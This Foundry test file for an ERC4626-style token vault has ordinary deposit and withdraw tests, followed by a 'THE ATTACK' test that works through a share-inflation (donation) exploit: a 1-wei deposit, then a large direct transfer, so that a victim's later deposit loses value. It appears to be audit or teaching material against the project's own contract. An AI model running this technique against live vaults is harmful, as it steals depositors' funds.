// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
import {MockToken} from "../src/mock/ERC20Token.sol";

contract VaultTest is Test {
    Vault public vault;
    MockToken public token;

    address public owner = makeAddr("owner");
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");

    uint256 constant INITIAL_BALANCE = 10000e18 + 1;
    uint256 constant FEE = 200;
    uint256 constant FEE_DENOMINATOR = 10000;

    function setUp() public {
        vm.startPrank(owner);

        token = new MockToken("Mock Token", "MKT");
        vault = new Vault(token);
        vm.stopPrank();   
        
        token.mint(user1, INITIAL_BALANCE);
        token.mint(user2, INITIAL_BALANCE);
    }

    function test_InitialState() public view {
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.owner(), owner);
        assertEq(vault.totalAssets(), 0);
    }

    function test_DepositSuccessful() public {
        uint256 depositAmount = 100e18;

        vm.startPrank(user1);
        token.approve(address(vault), depositAmount);

        uint256 shares = vault.deposit(depositAmount, user1);
        vm.stopPrank();

        assertEq(token.balanceOf(user1), INITIAL_BALANCE - depositAmount);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(vault.balanceOf(user1), shares);
    }

    function test_WithdrawSuccessful() public {
        uint256 depositAmount = 100e18;

        vm.startPrank(user1);
        token.approve(address(vault), depositAmount);
        uint256 shares = vault.deposit(depositAmount, user1);
        vm.stopPrank();

        assertEq(token.balanceOf(user1), INITIAL_BALANCE - depositAmount);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(vault.balanceOf(user1), shares);

        uint256 withdrawAmount = depositAmount / 2;
        uint256 expectedShares = vault.previewWithdraw(withdrawAmount);

        vm.startPrank(user1);
        vault.withdraw(withdrawAmount, user1, user1);

        assertEq(vault.balanceOf(user1), shares - expectedShares);
        assertEq(token.balanceOf(user1), INITIAL_BALANCE - depositAmount + withdrawAmount);
        assertEq(token.balanceOf(address(vault)), depositAmount - withdrawAmount);
    }

    /////////////// THE ATTACK ///////////////////////

    function test_Attack() public {
        // Attacker deposits minimal amount
        vm.startPrank(user1);
        token.approve(address(vault), type(uint256).max);
        
        // Initial deposit of 1 wei to get shares
        uint256 initialDeposit = 1;
        uint256 shares_user1 = vault.deposit(initialDeposit, user1);
        console2.log("Attacker initial shares:", shares_user1);
        console2.log("Initial vault total assets:", vault.totalAssets());

        // Attacker inflates the pool by transferring directly
        // Need a much larger amount to overcome the +1 protection
        uint256 inflationAmount = 10000e18;
        token.transfer(address(vault), inflationAmount);
        console2.log("Vault total assets after inflation:", vault.totalAssets());
        vm.stopPrank();

        // Victim tries to deposit
        vm.startPrank(user2);
        token.approve(address(vault), type(uint256).max);
        uint256 victimDeposit = 100e18;
        uint256 shares_user2 = vault.deposit(victimDeposit, user2);
        console2.log("Victim deposit amount:", victimDeposit);
        console2.log("Victim shares received:", shares_user2);
        vm.stopPrank();

        // Attacker withdraws
        vm.startPrank(user1);
        uint256 attacker_assets = vault.previewRedeem(shares_user1);
        console2.log("Attacker can withdraw assets:", attacker_assets);
        vault.redeem(shares_user1, user1, user1);
        console2.log("Attacker final balance:", token.balanceOf(user1));
        vm.stopPrank();

        // Check victim's redeemable assets
        vm.startPrank(user2);
        uint256 victim_assets = vault.previewRedeem(shares_user2);
        console2.log("Victim can withdraw assets:", victim_assets);
        vm.stopPrank();
    }
}